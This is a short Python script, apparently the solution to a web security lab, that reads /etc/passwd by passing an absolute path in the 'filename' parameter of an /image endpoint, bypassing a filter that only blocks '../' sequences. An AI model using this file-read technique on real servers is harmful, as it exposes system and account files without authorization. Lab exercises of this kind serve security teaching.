import sys
import os
sys.path.insert(0, os.path.join(os.path.dirname(__file__), "../.."))
from utils.base import LabSession

lab = LabSession()

# server blocks ../ sequences but doesn't check for absolute paths
# skip traversal entirely and request the file by its full path from root
resp = lab.get("/image", params={"filename": "/etc/passwd"})

if resp.status_code == 200 and "root:" in resp.text:
    lab.success("Got /etc/passwd:")
    print(resp.text)
else:
    lab.fail(f"Traversal failed (status {resp.status_code})")

lab.check_solved()
